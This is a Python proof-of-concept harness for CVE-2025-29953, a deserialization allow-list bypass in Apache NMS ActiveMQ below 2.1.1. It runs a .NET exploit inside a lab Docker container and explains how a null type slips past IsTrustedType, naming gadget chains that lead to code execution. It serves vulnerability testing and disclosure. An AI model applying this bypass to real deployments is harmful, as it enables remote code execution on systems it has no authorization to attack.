#!/usr/bin/env python3
# Exploit Title: Apache ActiveMQ NMS OpenWire < 2.1.1 - Deserialization Filter Bypass
# Exploit Author: Exploit Intelligence Platform (EIP)
# Vendor Homepage: https://activemq.apache.org/
# Version: Apache NMS ActiveMQ < 2.1.1
# Tested on: Apache NMS ActiveMQ 2.1.0 / .NET 6.0
# CVE: CVE-2025-29953
# Reference: https://exploit-intel.com
"""
PoC for CVE-2025-29953: Apache ActiveMQ NMS OpenWire Client Deserialization Filter Bypass

Demonstrates the deserialization type filter bypass in Apache.NMS.ActiveMQ < 2.1.1.
The NmsDefaultDeserializationPolicy.IsTrustedType() method returns true when passed
a null Type (because type?.FullName evaluates to null, and null FullName is treated
as trusted). Combined with TrustedClassFilter.BindToType() not checking for null
return from FormatterServices.GetTypeFromAssembly(), this allows arbitrary types to
bypass the allow/deny list and be deserialized via BinaryFormatter.

This script orchestrates the .NET PoC inside the lab container to demonstrate:
1. The core bug: IsTrustedType(null) returns true
2. The full bypass: BinaryFormatter deserialization past a restrictive allow list

Attack vector: LOCAL (direct BinaryFormatter deserialization with vulnerable binder)
Prerequisites: Lab containers running (cve-2025-29953-vulnerable)

CVSS: 9.8 (CRITICAL) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
CWE:  CWE-502 (Deserialization of Untrusted Data)

Usage:
    python3 poc.py [container_name]
    python3 poc.py                          # default: cve-2025-29953-vulnerable
    python3 poc.py cve-2025-29953-patched   # test against patched version

References:
    - Fix: https://github.com/apache/activemq-nms-openwire/commit/8944c41
    - Advisory: https://lists.apache.org/thread/vc1sj9y3056d3kkhcvrs9fyw5w8kpmlx
    - Bypass technique: https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html
"""

import subprocess
import sys
import re


# Default lab container name
DEFAULT_CONTAINER = "cve-2025-29953-vulnerable"

# Exit code meanings from the .NET PoC
EXIT_CODES = {
    0: "VULNERABLE - Deserialization filter bypass confirmed",
    1: "ERROR - Test failed unexpectedly",
    2: "PATCHED - Filter correctly blocked the attack",
}


def run_command(cmd, timeout=60):
    """Execute a command and return (returncode, stdout, stderr)."""
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"
    except FileNotFoundError:
        return -2, "", f"Command not found: {cmd[0]}"


def check_container_running(container_name):
    """Verify the target container is running."""
    print(f"[*] Checking if container '{container_name}' is running...")
    rc, stdout, stderr = run_command(
        ["docker", "inspect", "--format", "{{.State.Running}}", container_name]
    )
    if rc != 0:
        print(f"[!] Container '{container_name}' not found.")
        print(f"    Error: {stderr.strip()}")
        return False

    running = stdout.strip().lower() == "true"
    if running:
        print(f"[+] Container '{container_name}' is running.")
    else:
        print(f"[!] Container '{container_name}' exists but is not running.")
    return running


def get_container_ip(container_name):
    """Get the container's IP address on the first network."""
    rc, stdout, _ = run_command(
        ["docker", "inspect", "--format",
         "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}",
         container_name]
    )
    if rc == 0 and stdout.strip():
        return stdout.strip().split("\n")[0]
    return None


def run_local_exploit(container_name):
    """
    Run the local deserialization filter bypass test.

    This test demonstrates the core vulnerability:
    1. Creates a NmsDefaultDeserializationPolicy with a restrictive allow list
       (only allowing TrustedType)
    2. Verifies the allow list correctly blocks MaliciousSerializable
    3. Shows that IsTrustedType(null) returns true (THE BUG)
    4. Performs full BinaryFormatter serialization/deserialization showing:
       - MaliciousSerializable.GetObjectData() manipulates SerializationInfo
       - BindToType() calls FormatterServices.GetTypeFromAssembly() which returns null
       - IsTrustedType(destination, null) returns true (null bypass)
       - BindToType() returns null -> BinaryFormatter fallback resolves actual type
       - Deserialization succeeds despite type not being on the allow list
    """
    print()
    print("=" * 72)
    print("CVE-2025-29953: Local Deserialization Filter Bypass PoC")
    print("=" * 72)
    print()
    print("Vector:       Direct BinaryFormatter deserialization with TrustedClassFilter")
    print("Vulnerability: IsTrustedType(null) returns true; BindToType returns null")
    print("Impact:       Arbitrary type deserialization past allow/deny list")
    print()
    print("-" * 72)
    print("Running .NET PoC inside container...")
    print("-" * 72)
    print()

    # Execute the .NET PoC in 'local' mode inside the vulnerable container
    cmd = [
        "docker", "exec",
        container_name,
        "dotnet", "/app/PocApp.dll", "local"
    ]

    rc, stdout, stderr = run_command(cmd, timeout=30)

    # Print the full output from the .NET PoC
    if stdout:
        for line in stdout.rstrip().split("\n"):
            print(f"  {line}")
    if stderr:
        for line in stderr.rstrip().split("\n"):
            print(f"  [stderr] {line}")

    print()
    print("-" * 72)
    print("Result Analysis")
    print("-" * 72)
    print()

    # Analyze the results
    vulnerable = False

    if rc == 0:
        # Check for specific vulnerability markers in the output
        if "VULNERABLE" in stdout and "filter bypass" in stdout.lower():
            vulnerable = True
            print("[+] CONFIRMED: CVE-2025-29953 deserialization filter bypass succeeded!")
            print()
            print("    Root cause: NmsDefaultDeserializationPolicy.IsTrustedType() returns")
            print("    true when type is null (type?.FullName == null -> return true)")
            print()
            print("    Impact: An attacker can send a crafted BinaryFormatter payload")
            print("    using ISerializable to manipulate SerializationInfo, causing")
            print("    FormatterServices.GetTypeFromAssembly() to return null.")
            print("    The null type passes IsTrustedType(), and BindToType() returns")
            print("    null, triggering BinaryFormatter's fallback type resolver.")
            print("    This bypasses ALL allow/deny list restrictions.")
            print()
            print("    In a real attack, the deserialized type would be a .NET gadget")
            print("    chain (TypeConfuseDelegate, ObjectDataProvider, etc.) leading")
            print("    to arbitrary code execution.")
        elif "null type bypass" in stdout.lower():
            vulnerable = True
            print("[+] CONFIRMED: Core null type bypass in IsTrustedType demonstrated!")
        else:
            print("[?] Exit code 0 but vulnerability markers not found in output.")
    elif rc == 2:
        print("[-] PATCHED: The filter correctly blocked the deserialization attempt.")
        print("    This container appears to be running the fixed version (>= 2.1.1).")
    elif rc == -1:
        print("[!] ERROR: Command timed out.")
    else:
        print(f"[!] ERROR: Unexpected exit code {rc}")
        if stderr:
            print(f"    stderr: {stderr.strip()}")

    print()
    print(f"  Exit code: {rc} ({EXIT_CODES.get(rc, 'Unknown')})")
    print(f"  Status:    {'VULNERABLE' if vulnerable else 'NOT CONFIRMED'}")
    print()

    return 0 if vulnerable else 1


def main():
    container_name = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_CONTAINER

    print(f"[*] CVE-2025-29953 PoC - Apache NMS OpenWire Deserialization Filter Bypass")
    print(f"[*] Target container: {container_name}")

    # Step 1: Verify container is running
    if not check_container_running(container_name):
        print("[!] Cannot proceed without a running container.")
        print(f"    Start the lab: docker compose up -d")
        return 1

    # Step 2: Show container info
    ip = get_container_ip(container_name)
    if ip:
        print(f"[*] Container IP: {ip}")

    # Step 3: Run the exploit
    return run_local_exploit(container_name)


if __name__ == "__main__":
    sys.exit(main())
